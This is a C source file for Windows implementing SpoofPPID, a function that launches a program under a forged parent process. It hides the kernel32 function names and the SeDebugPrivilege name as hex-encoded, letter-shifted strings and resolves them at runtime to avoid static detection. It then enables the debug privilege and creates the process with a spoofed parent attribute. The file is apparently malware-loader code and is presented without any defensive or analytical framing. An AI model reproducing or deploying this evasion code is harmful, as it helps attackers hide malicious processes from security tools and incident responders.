#include <windows.h>

BOOL SpoofPPID(DWORD parentPid, char *exePath, char *arguments) {
    BOOL (WINAPI *pCloseHandle)(
        HANDLE hObject
        );
    HANDLE (WINAPI *pOpenProcess)(
        DWORD dwDesiredAccess,
        BOOL bInheritHandle,
        DWORD dwProcessI
        );
    BOOL (WINAPI *pInitializeProcThreadAttributeList)(
        LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        DWORD dwAttributeCount,
        DWORD dwFlags,
        PSIZE_T lpSize
        );
    BOOL (WINAPI *pUpdateProcThreadAttribute)(
        LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        DWORD dwFlags,
        DWORD_PTR Attribute,
        PVOID lpValue,
        SIZE_T cbSize,
        PVOID lpPreviousValue,
        PSIZE_T lpReturnSize
        );
    void (WINAPI *pDeleteProcThreadAttributeList)(
        LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList
        );
    BOOL (WINAPI *pCreateProcessA)(
        LPCSTR lpApplicationName,
        LPSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCSTR lpCurrentDirectory,
        LPSTARTUPINFOA lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
        );

    // Decode and decrypt dll names
    char kernel32[100];
    decryptData("6e687571686f363531676f6f", kernel32);

    // Decode and decrypt function names
    char closeHandle[100];
    decryptData("466f7276684b6471676f68", closeHandle);

    char openProcess[100];
    decryptData("5273687153757266687676", openProcess);

    char initializeProcThreadAttributeList[100];
    decryptData("4c716c776c646f6c7d6853757266576b75686467447777756c657877684f6c7677", initializeProcThreadAttributeList);

    char updateProcThreadAttribute[100];
    decryptData("58736764776853757266576b75686467447777756c65787768", updateProcThreadAttribute);

    char deleteProcThreadAttributeList[100];
    decryptData("47686f68776853757266576b75686467447777756c657877684f6c7677", deleteProcThreadAttributeList);

    char createProcessA[100];
    decryptData("4675686477685375726668767644", createProcessA);

    // Load functions
    pCloseHandle = LoadLibraryAndFunction(kernel32, closeHandle);
    pOpenProcess = LoadLibraryAndFunction(kernel32, openProcess);
    pInitializeProcThreadAttributeList = LoadLibraryAndFunction(kernel32, initializeProcThreadAttributeList);
    pUpdateProcThreadAttribute = LoadLibraryAndFunction(kernel32, updateProcThreadAttribute);
    pDeleteProcThreadAttributeList = LoadLibraryAndFunction(kernel32, deleteProcThreadAttributeList);
    pCreateProcessA = LoadLibraryAndFunction(kernel32, createProcessA);

    if (!pOpenProcess || !pInitializeProcThreadAttributeList || !pUpdateProcThreadAttribute ||
            !pDeleteProcThreadAttributeList || !pCreateProcessA) { 
        return FALSE;
    }

    char seDebugPrivilege[50];
    decryptData("5668476865786a53756c796c6f686a68", seDebugPrivilege);
    
    // Enable the SeDebugPrivilege privilege
    if (!EnablePrivilege(seDebugPrivilege)) {
        printf("Failed to enable %s\n", seDebugPrivilege);
        return FALSE;
    }

    // Get a handle to the parent process
    HANDLE hParentProcess = pOpenProcess(
        PROCESS_CREATE_PROCESS,
        FALSE,
        parentPid
        );
    if (!hParentProcess) {
        return FALSE;
    }

    STARTUPINFOEXA si = {0};
    PROCESS_INFORMATION pi = {0};
    SIZE_T attributeSize = 0;

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Initialize attribute list
    pInitializeProcThreadAttributeList(
        NULL,
        1,
        0,
        &attributeSize
        );
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attributeSize);
    if (!si.lpAttributeList) {
        pCloseHandle(hParentProcess);
        return FALSE;
    }

    if (!pInitializeProcThreadAttributeList(
            si.lpAttributeList,
            1,
            0,
            &attributeSize
            )) {
        free(si.lpAttributeList);
        pCloseHandle(hParentProcess);
        return FALSE;
    }

    // Set the parent process attribute
    if (!pUpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParentProcess,
            sizeof(HANDLE),
            NULL,
            NULL
            )) {
        pDeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
        pCloseHandle(hParentProcess);
        return FALSE;
    }

    // Create the new process
    if (!pCreateProcessA(
            exePath,
            arguments,
            NULL,
            NULL,
            FALSE,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si.StartupInfo,
            &pi
            )) {
        pDeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
        pCloseHandle(hParentProcess);
        return FALSE;
    }

    printf("Process created successfully! PID: %lu\n", pi.dwProcessId);

    // Cleanup
    pCloseHandle(pi.hProcess);
    pCloseHandle(pi.hThread);
    pDeleteProcThreadAttributeList(si.lpAttributeList);
    free(si.lpAttributeList);
    pCloseHandle(hParentProcess);
    return TRUE;
}